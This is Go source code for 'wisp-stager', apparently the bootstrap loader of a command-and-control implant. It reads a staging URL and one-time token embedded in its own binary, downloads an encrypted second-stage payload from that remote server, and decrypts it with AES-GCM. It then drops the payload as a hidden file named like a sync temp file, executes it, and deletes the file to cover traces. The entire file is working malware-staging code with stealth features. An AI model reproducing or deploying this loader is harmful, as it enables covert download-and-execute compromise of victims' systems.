// wisp-stager: Type4 bootstrap (plan §2.5). Reads its own sentinel slot for
// {staged URL, psk}, fetches stage2 (JSON + AES-256-GCM, key derived from the
// one-time token), writes it to a private temp file and executes it.
// Windows in-memory execution (VirtualAlloc/raw) belongs to the C/Rust
// stagers and sRDI path (later increments); this Go stager is the default.
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"wispp/protocol"
)

var anchor = protocol.SentinelSlot[:] // keep the slot in this binary

type stageResp struct {
	V  int    `json:"v"`
	IV string `json:"iv"`
	CT string `json:"ct"`
}

func main() {
	noDelete := flag.Bool("no-delete", false, "keep the dropped stage2 file (lab debugging only)")
	flag.Parse()
	exe, _ := os.Executable()
	image, err := os.ReadFile(exe)
	if err != nil {
		log.Fatalf("stager: %v", err)
	}
	cfg, ok, err := protocol.FindCfgSlot(image)
	if !ok || err != nil || cfg.Staged == "" {
		log.Fatal("stager: no stage URL in sentinel slot")
	}
	token := cfg.Staged[strings.LastIndex(cfg.Staged, "/")+1:]

	data, err := fetchStage(cfg.Staged)
	if err != nil {
		log.Fatalf("stager: %v", err)
	}
	key := protocol.StageDerivedKey(protocol.DomainStage, token)
	block, err := aes.NewCipher(key[:])
	if err != nil {
		log.Fatal(err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		log.Fatal(err)
	}
	if len(data) < 12+16 {
		log.Fatal("stager: stage response too short")
	}
	payload, err := gcm.Open(nil, data[:12], data[12:], nil)
	if err != nil {
		log.Fatalf("stager: stage decrypt failed (token replayed/expired?): %v", err)
	}

	dir, err := os.MkdirTemp("", "w")
	if err != nil {
		log.Fatal(err)
	}
	if err := os.Chmod(dir, 0o700); err != nil {
		log.Printf("stager: chmod temp dir: %v", err)
	}
	// keep the agent alive even if the stager's cwd/tmp gets cleaned
	tmp := filepath.Join(dir, fmt.Sprintf(".sync.tmp.%d", os.Getpid()))
	if err := os.WriteFile(tmp, payload, 0o700); err != nil {
		log.Fatal(err)
	}
	hideFile(tmp)
	child := exec.Command(tmp)
	child.Stdout, child.Stderr, child.Stdin = os.Stdout, os.Stderr, os.Stdin
	if err := child.Start(); err != nil {
		log.Fatalf("stager: exec: %v", err)
	}
	if *noDelete {
		log.Printf("stager: stage2 kept at %s (--no-delete)", tmp)
		_ = anchor
		return
	}
	// Unix lets the running image be unlinked right away; Windows keeps the
	// image locked until the child exits, so this cleanup is best-effort there.
	if err := os.Remove(tmp); err == nil {
		_ = os.RemoveAll(dir)
	}
	_ = anchor
}

func fetchStage(url string) ([]byte, error) {
	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("stage endpoint HTTP %d", resp.StatusCode)
	}
	body, err := io.ReadAll(io.LimitReader(resp.Body, 64<<20))
	if err != nil {
		return nil, err
	}
	var sr stageResp
	if err := json.Unmarshal(body, &sr); err != nil {
		return nil, fmt.Errorf("bad stage response: %w", err)
	}
	iv, err := base64.StdEncoding.DecodeString(sr.IV)
	if err != nil {
		return nil, err
	}
	ct, err := base64.StdEncoding.DecodeString(sr.CT)
	if err != nil {
		return nil, err
	}
	return append(iv, ct...), nil
}
